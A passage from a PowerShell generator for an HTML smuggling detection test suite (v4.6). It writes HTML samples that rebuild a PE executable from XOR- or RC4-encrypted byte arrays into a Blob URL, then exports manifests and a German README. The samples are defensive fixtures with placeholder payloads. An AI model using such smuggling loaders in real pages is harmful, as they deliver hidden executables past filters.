Add-TestFile -List ([ref]$testFiles) -Name 'test55_v46_xor_constant_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'xor_constant_payload,dec_pe' -Description 'Konstantes XOR Bytearray wird mit festem Key rekonstruiert und als PE klassifiziert' -Category 'V46_CRYPTO' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var enc = [$XOR_PE_ARRAY];
var key = 0x23;
var out = [];
for (var i=0; i<enc.length; i++) { out.push(enc[i] ^ key); }
var u = new Uint8Array(out);
var b = new Blob([u], {type:'application/octet-stream'});
URL.createObjectURL(b);
</script>
</body></html>
"@

# 56
Add-TestFile -List ([ref]$testFiles) -Name 'test56_v46_rc4_constant_pe.html' -ExpectedScore '10-15 capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'rc4_constant_payload,dec_pe' -Description 'Konstantes RC4 Bytearray mit festem String Key wird rekonstruiert und als PE klassifiziert' -Category 'V46_CRYPTO' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var encrypted = [$RC4_PE_ARRAY];
var key = "$RC4_KEY";
function rc4(data, key) {
  var s = [], j = 0, x, out = [];
  for (var i=0; i<256; i++) s[i]=i;
  for (var i=0; i<256; i++) { j=(j+s[i]+key.charCodeAt(i%key.length))%256; x=s[i]; s[i]=s[j]; s[j]=x; }
  i=0; j=0;
  for (var y=0; y<data.length; y++) { i=(i+1)%256; j=(j+s[i])%256; x=s[i]; s[i]=s[j]; s[j]=x; out.push(data[y] ^ s[(s[i]+s[j])%256]); }
  return out;
}
var plain = rc4(encrypted, key);
var u = new Uint8Array(plain);
var b = new Blob([u], {type:'application/octet-stream'});
URL.createObjectURL(b);
</script>
</body></html>
"@

$successCount = 0
$errorCount = 0
$summary = @()

Write-Host ""
Write-Host "Generiere Testdateien..." -ForegroundColor Yellow
Write-Host ""

Push-Location -LiteralPath $outputRoot
try {
  foreach ($file in $testFiles) {
    try {
      $path = Join-Path -Path (Get-Location).Path -ChildPath $file.Name

      if ((Test-Path -LiteralPath $path) -and (-not $Force)) {
        Write-Host "Ueberspringe existierende Datei: $($file.Name) (nutze -Force)" -ForegroundColor Yellow
        continue
      }

      Write-Utf8NoBomFile -Path $path -Content $file.Content

      Write-Host "OK  $($file.Name)" -ForegroundColor Green
      Write-Host "   Score: $($file.ExpectedScore) | Detection: $($file.ExpectedDetection)" -ForegroundColor Gray
      Write-Host "   Core:  $($file.ExpectedCoreReasons)" -ForegroundColor DarkGray
      Write-Host "   Info:  $($file.ExpectedInfoReasons)" -ForegroundColor DarkGray
      Write-Host "   $($file.Description)" -ForegroundColor DarkGray
      Write-Host ""

      $summary += [PSCustomObject]@{
        File = $file.Name
        Category = $file.Category
        ExpectedScore = $file.ExpectedScore
        ExpectedDetection = $file.ExpectedDetection
        ExpectedCoreReasons = $file.ExpectedCoreReasons
        ExpectedInfoReasons = $file.ExpectedInfoReasons
        Description = $file.Description
      }

      $successCount++
    }
    catch {
      Write-Host "Fehler bei $($file.Name): $($_.Exception.Message)" -ForegroundColor Red
      $errorCount++
    }
  }

  $csvPath = Join-Path -Path (Get-Location).Path -ChildPath 'test_manifest.csv'
  $jsonPath = Join-Path -Path (Get-Location).Path -ChildPath 'test_manifest.json'
  $readmePath = Join-Path -Path (Get-Location).Path -ChildPath 'README.txt'

  $summary | Export-Csv -LiteralPath $csvPath -NoTypeInformation -Encoding UTF8
  ($summary | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $jsonPath -Encoding UTF8

  $readme = @"
HTML Pattern Test Suite v4.6.0-r1

Diese Suite deckt absichtlich primaer HTML und Script Muster ab und wurde fuer
HTML Smuggling Detection v4.6.0 erweitert.

Neu in v4.6.0 innerhalb dieser HTML Suite:
- Script Prescan inklusive script_prescan_payload
- Script Prescan Budget mit mehr als 64 Inline Scripts
- hexadezimale Uint8Array PE Rekonstruktion
- rekursives Base64 Decoding
- GZIP Magic Klassifikation
- echtes ZIP Local Header / Central Directory Testmaterial
- ZIP Executable und Script Members
- ZIP Double Extension und Path Traversal
- ZIP Nested Archive und Encryption Flag
- ZIP High Compression Ratio und Many Entries Info Pfade
- Stored ZIP Payload mit rekursiver PE Analyse
- konstante XOR Payload Rekonstruktion
- konstante RC4 Payload Rekonstruktion

Bewusst NICHT vollstaendig abgedeckt:
- echte MIME Attachment Dateinamen und MIME Part Typen
- Attachment Magic Mismatch zwischen Dateiname und MIME Inhalt
- Image Tail Carving an echten PNG, JPEG, GIF und WebP Mailparts
- echte Newsletter Header und trusted sender Maps
- globale Byte und Container Budgets ueber viele MIME Parts
- globale Runtime Budgets als deterministischer Test
- OneNote, DOCM, XLSM, LNK und Script Dateien als echte Mailparts

Dafuer braucht es weiterhin eine separate EML Suite.

Wichtige v4.6 Standardwerte:
- script.max_check = 5
- script.prescan_chunk = 4096
- budget.max_runtime_ms = 250
- budget.max_total_bytes = 4 MiB
- budget.max_decode_ops = 24
- budget.max_container_ops = 8
- budget.max_scripts_prescanned = 64
- budget.max_script_prescan_bytes = 512 KiB
- zip.max_entries = 256
- zip.high_ratio = 100
- crypto.max_input_bytes = 64 KiB
- crypto.max_key_bytes = 64
- crypto.max_candidates = 4

Score Erwartungen sind bewusst als Bereiche angegeben. Entscheidend fuer Regressionstests
sind ExpectedDetection, ExpectedCoreReasons und ExpectedInfoReasons.
"@
  Write-Utf8NoBomFile -Path $readmePath -Content $readme

  Write-Host ""
  Write-Host "╔══════════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
  Write-Host "║                      HTML PATTERN SUITE v4.6 ABGESCHLOSSEN                               ║" -ForegroundColor Cyan
  Write-Host "╠══════════════════════════════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
  Write-Host "║  Ordner: $outputRoot" -ForegroundColor White
  Write-Host "║  Erfolgreich: $successCount von $($testFiles.Count)" -ForegroundColor Green
  if ($errorCount -gt 0) {
    Write-Host "║  Fehler: $errorCount" -ForegroundColor Red
  }
  Write-Host "║" -ForegroundColor Cyan
  Write-Host "║  Decode Gate Ziel: Base64 >= $MinDecodeBase64Chars Zeichen" -ForegroundColor Yellow
  Write-Host "║  Payload Byte Ziel: >= $TargetPayloadBytes Bytes" -ForegroundColor Yellow
  Write-Host "║" -ForegroundColor Cyan
  Write-Host "║  Coverage:" -ForegroundColor Magenta
  Write-Host "║    JS_SMUGGLING, OBFUSCATION, PRESCAN, WASM, PDF, SVG, CERT, CSS, GEO, EVASION" -ForegroundColor Gray
  Write-Host "║    PERSISTENCE, CLICKFIX, WEB3, ZIP-PARSER, XOR, RC4, COMPRESSED, NEGATIVE" -ForegroundColor Gray
  Write-Host "║" -ForegroundColor Cyan
  Write-Host "║  CSV Manifest:  $csvPath" -ForegroundColor Gray
  Write-Host "║  JSON Manifest: $jsonPath" -ForegroundColor Gray
  Write-Host "║  README:        $readmePath" -ForegroundColor Gray
  Write-Host "╚══════════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
  Write-Host ""
}
finally {
  Pop-Location
}
